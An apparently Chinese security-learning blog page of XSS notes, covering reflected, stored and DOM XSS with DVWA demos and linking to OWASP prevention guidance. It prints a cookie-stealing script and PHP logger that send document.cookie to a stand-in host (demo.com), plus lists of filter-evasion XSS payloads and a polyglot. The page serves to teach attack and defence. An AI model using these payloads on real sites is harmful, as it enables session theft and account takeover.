@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/image3.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>XSS学习笔记 - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/image1.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期日, 五月 3日 2020, 3:34 下午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.5k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      6 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p class="note note-warning">本文最后更新于：星期一, 五月 4日 2020, 4:57 下午</p>
+            
+            <div class="markdown-body">
+              <h2 id="XSS学习笔记"><a href="#XSS学习笔记" class="headerlink" title="XSS学习笔记"></a>XSS学习笔记</h2><p>如题</p>
+<h3 id="XSS概述"><a href="#XSS概述" class="headerlink" title="XSS概述"></a>XSS概述</h3><p> 跨站脚本攻击—XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。 </p>
+<h3 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h3><h4 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h4><p>反射型XSS也叫非持久型XSS，最常见的就是在URL中构造，将恶意连接发送给目标用户。当用户访问该链接时，会向服务器发起一个GET请求来提交带有恶意代码的链接。</p>
+<p>DVWA中的demo:</p>
+<pre><code class="php">&lt;?php
+
+if(!array_key_exists (&quot;name&quot;, $_GET) || $_GET[&#39;name&#39;] == NULL || $_GET[&#39;name&#39;] == &#39;&#39;){
+     $isempty = true;
+} else {       
+     echo &#39;&lt;pre&gt;&#39;;
+     echo &#39;Hello &#39; . $_GET[&#39;name&#39;];
+     echo &#39;&lt;/pre&gt;&#39;;
+
+}
+</code></pre>
+<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>存储型XSS也叫持久型XSS，常见存在与博客的留言板、反馈投诉、论坛评论等地方，它会将恶意代码和正文都存储进服务器。用户每次访问页面都会触发恶意代码。</p>
+<p>demo:</p>
+<pre><code class="php">&lt;?php
+
+if(isset($_POST[&#39;btnSign&#39;]))
+{
+
+   $message = trim($_POST[&#39;mtxMessage&#39;]);
+   $name    = trim($_POST[&#39;txtName&#39;]);
+
+   // Sanitize message input
+   $message = stripslashes($message);
+   $message = mysql_real_escape_string($message);
+
+   // Sanitize name input
+   $name = mysql_real_escape_string($name);
+
+   $query = &quot;INSERT INTO guestbook (comment,name) VALUES (&#39;$message&#39;,&#39;$name&#39;);&quot;;
+
+   $result = mysql_query($query) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );
+
+}
+
+?&gt;
+</code></pre>
+<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DOM型XSS也是反射型的一种，不过比较特殊。它不会和服务器发生交互，它通过修改页面的DOM节点来形成XSS漏洞。我们可以通js脚本DOM进行编辑从而修改页面的元素。也就是说，客户端的脚本可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。</p>
+<p>demo:</p>
+<pre><code class="javascript">&lt;script&gt; 
+    var img=document.createElement(&quot;img&quot;);
+    img.src=&quot;http://demo.com/cookie?&quot;+escape(document.cookie);
+&lt;/script&gt;
+</code></pre>
+<h3 id="XSS危害"><a href="#XSS危害" class="headerlink" title="XSS危害"></a>XSS危害</h3><ul>
+<li><p>Cookie盗取</p>
+<p>服务器端脚本：</p>
+<pre><code class="php">#http://demo.com/xss_cookie.php
+&lt;?php
+    $cookie = $_GET[&#39;cookie&#39;];
+    $log = fopen(&quot;cookie.txt&quot;,&quot;a&quot;);
+    fwrite($log, $cookie.&quot;\n&quot;)
+    fclose($log);
+?&gt;
+</code></pre>
+<p>在存在XSS漏洞的地方插入下面的代码:</p>
+<pre><code class="javascript">&lt;script&gt;
+var img = document.createElement(&quot;img&quot;);
+img.src = &quot;http://demo.com/xss_cookie.php?cookie=&quot;+escape(document.cookie);
+&lt;/script&gt;
+</code></pre>
+</li>
+<li><p>钓鱼（伪造登录框页面）</p>
+</li>
+<li><p>获取内网IP段</p>
+<p>参考这篇文章 <a href="https://toutiao.io/posts/8urlis/preview" target="_blank" rel="noopener">https://toutiao.io/posts/8urlis/preview</a> </p>
+</li>
+<li><p>站点重定向</p>
+</li>
+<li><p>获取客户端页面信息</p>
+</li>
+<li><p>XSS蠕虫</p>
+</li>
+</ul>
+<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p>漏洞挖掘的方法大致可以分成两类：</p>
+<ul>
+<li>人工挖掘</li>
+<li>利用工具自动化挖掘</li>
+</ul>
+<p>利用工具自动化挖掘本质就是将人工挖掘的流程自动化，流程还是差不多的。</p>
+<p>一般流程：</p>
+<ol>
+<li>寻找数据入口</li>
+<li>潜在注入点检测</li>
+<li>生成payload</li>
+<li>payload攻击验证</li>
+</ol>
+<p>寻找数据入口就是寻找WEB页面上的输入和输出口。例如网站输入框、URL参数，评论、留言版、或者Header头部里的UA/Referer/Cookie等。潜在注入点检测就是判断输入点是否可以成功将数据注入到页面。生成payload就是不断测试去调整payload，用payload进行不断的fuzz。当payload成功注入时，就意味着XSS注入成功了。</p>
+<h4 id="常用的探测向量"><a href="#常用的探测向量" class="headerlink" title="常用的探测向量"></a>常用的探测向量</h4><pre><code class="javascript">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script&gt;confirm(1)&lt;/script&gt;
+&lt;img src=x onerror=prompt(1);&gt;
+&lt;svg/onload=prompt(1);&gt;
+&lt;audio src=x onerror=prompt(1);&gt;
+</code></pre>
+<h4 id="Awesome-payloads"><a href="#Awesome-payloads" class="headerlink" title="Awesome payloads"></a>Awesome payloads</h4><pre><code class="javascript">&lt;A/hREf=&quot;j%0aavas%09cript%0a:%09con%0afirm%0d``&quot;&gt;z
+&lt;d3&quot;&lt;&quot;/onclick=&quot;1&gt;[confirm``]&quot;&lt;&quot;&gt;z
+&lt;d3/onmouseenter=[2].find(confirm)&gt;z
+&lt;details open ontoggle=confirm()&gt;
+&lt;script y=&quot;&gt;&lt;&quot;&gt;/*&lt;script* */prompt()&lt;/script
+&lt;w=&quot;/x=&quot;y&gt;&quot;/ondblclick=`&lt;`[confir\u006d``]&gt;z
+&lt;a href=&quot;javascript%26colon;alert(1)&quot;&gt;click
+&lt;a href=javas&amp;#99;ript:alert(1)&gt;click
+&lt;script/&quot;&lt;a&quot;/src=data:=&quot;.&lt;a,[8].some(confirm)&gt;
+&lt;svg/x=&quot;&gt;&quot;/onload=confirm()//
+&lt;--`&lt;img/src=` onerror=confirm``&gt; --!&gt;
+&lt;svg%0Aonload=%09((pro\u006dpt))()//
+&lt;sCript x&gt;(((confirm)))``&lt;/scRipt x&gt;
+&lt;svg &lt;/onload =&quot;1&gt; (_=prompt,_(1)) &quot;&quot;&gt;
+&lt;!--&gt;&lt;script src=//14.rs&gt;
+&lt;embed src=//14.rs&gt;
+&lt;script x=&quot;&gt;&quot; src=//15.rs&gt;&lt;/script&gt;
+&lt;!&#39;/*&quot;/*/&#39;/*/&quot;/*--&gt;&lt;/Script&gt;&lt;Image SrcSet=K */; OnError=confirm`1` //&gt;
+&lt;iframe/src \/\/onload = prompt(1)
+&lt;x oncut=alert()&gt;x
+&lt;svg onload=write()&gt;
+</code></pre>
+<p>一些速查表：</p>
+<ul>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" target="_blank" rel="noopener">Cross-site scripting (XSS) cheat sheet</a></li>
+<li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">xss-payload-list</a></li>
+<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank" rel="noopener">XSS Filter Evasion Cheat Sheet</a></li>
+</ul>
+<h4 id="Awesome-XSS-Polyglot"><a href="#Awesome-XSS-Polyglot" class="headerlink" title="Awesome XSS Polyglot"></a>Awesome XSS Polyglot</h4><p>XSS Polyglot也可以说是XSS通用攻击payload吧，它由不同语言的元素构成，能注入多种不同的上下文。</p>
+<p>一个例子：from: <a href="https://github.com/s0md3v/AwesomeXSS#awesome-polyglots" target="_blank" rel="noopener">https://github.com/s0md3v/AwesomeXSS#awesome-polyglots</a> </p>
+<pre><code class="javascript">%0ajavascript:`/*\&quot;/*--&gt;&amp;lt;svg onload=&#39;/*&lt;/template&gt;&lt;/noembed&gt;&lt;/noscript&gt;&lt;/style&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;html onmouseover=&quot;/**/ alert()//&#39;&quot;&gt;`
+</code></pre>
+<p>解释：</p>
+<p><img src="/picture/image-20200504162932559.png" srcset="/img/loading.gif" alt="image-20200504162932559"></p>
+<h4 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h4><ul>
+<li>闭合标签：<code>“&gt;&lt;script&gt;alert(1);&lt;/script&gt;</code></li>
+<li>利用html标签的属性值：<code>&lt;img src=&quot;javascript:alert(1);&quot;&gt;</code></li>
+<li>空格/tab/回车:<code>&lt;img src=&quot;java    script:alert(1);&quot; &gt;</code></li>
+<li>字符编码：<code>%c1;alert(1);//</code></li>
+<li>圆括号过滤：<code>&lt;a onmouseover=&quot;javascript:window.onerror=alert;throw 1&quot;&gt;</code></li>
+<li>实体解码</li>
+<li>使用 十六进制、八进制、Unicode、HTML等进行编码</li>
+<li>Alert被过滤：使用prompt和confirm代替</li>
+</ul>
+<h3 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>参照： <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank" rel="noopener">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a> </p>
+<p>最后推荐两个xss闯关网址：</p>
+<ul>
+<li><a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">http://xss-quiz.int21h.jp/</a> </li>
+<li><a href="https://www.xssgame.com/m4KKGHi2rVUN" target="_blank" rel="noopener">https://www.xssgame.com/m4KKGHi2rVUN</a> </li>
+</ul>
+<p>等我有空就去玩一下</p>
+<h3 id="REFERENCE"><a href="#REFERENCE" class="headerlink" title="REFERENCE"></a>REFERENCE</h3><ul>
+<li><a href="https://github.com/s0md3v/AwesomeXSS" target="_blank" rel="noopener">https://github.com/s0md3v/AwesomeXSS</a> </li>
+<li><a href="https://github.com/hongriSec/Web-Security-Attack/blob/master/Part1/Day2/files/README.md" target="_blank" rel="noopener">https://github.com/hongriSec/Web-Security-Attack/blob/master/Part1/Day2/files/README.md</a> </li>
+<li><a href="https://github.com/payloadbox/xss-payload-list" target="_blank" rel="noopener">https://github.com/payloadbox/xss-payload-list</a> </li>
+<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank" rel="noopener">https://owasp.org/www-community/xss-filter-evasion-cheatsheet</a> </li>
+<li><a href="https://thief.one/2017/05/31/1/" target="_blank" rel="noopener">https://thief.one/2017/05/31/1/</a> </li>
+<li><a href="https://zhuanlan.zhihu.com/p/26086290" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26086290</a> </li>
+<li><a href="https://www.jianshu.com/p/13f0b9a15e46" target="_blank" rel="noopener">https://www.jianshu.com/p/13f0b9a15e46</a> </li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/WEB/">WEB</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <div class="comments" id="comments">
+                
+                
+  <script defer src="https://utteranc.es/client.js" repo="zszcr/comment" issue-term="pathname" label="utterances" theme="github-light" crossorigin="anonymous" async>
+  </script>
+
+
+              </div>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    </div>
+    
+  <div>
+    
+      <!-- 不蒜子统计PV -->
+      
+      <span id="busuanzi_container_site_pv" style="display: none">
+      总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    </span>
+    
+    
+      <!-- 不蒜子统计UV -->
+      
+      <span id="busuanzi_container_site_uv" style="display: none">
+      总访客数 <span id="busuanzi_value_site_uv"></span> 人
+    </span>
+    
+  </div>
+
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+<script src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js"></script>
+<script src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js"></script>
+<script src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+  <script src="/js/lazyload.js"></script>
+
+
+
+  
+  <script src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var post = $('#post');
+      var toc = $('#toc');
+      var tocLimMax = post.offset().top + post.height() - navHeight;
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = $('#board-ctn').css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+
+
+  <script defer src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<!-- Plugins -->
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      (function (i, s, o, g, r, a, m) {
+        i['GoogleAnalyticsObject'] = r;
+        i[r] = i[r] || function () {
+          (i[r].q = i[r].q || []).push(arguments)
+        }, i[r].l = 1 * new Date();
+        a = s.createElement(o),
+          m = s.getElementsByTagName(o)[0];
+        a.async = 1;
+        a.src = g;
+        m.parentNode.insertBefore(a, m)
+      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+
+      ga('create', 'UA-160202176-1', 'auto');
+      ga('send', 'pageview');
+    </script>
+  
+
+  
+
+  
+
+  
+
+
+
+  <script src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "XSS学习笔记&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js"></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script src="/js/local-search.js"></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
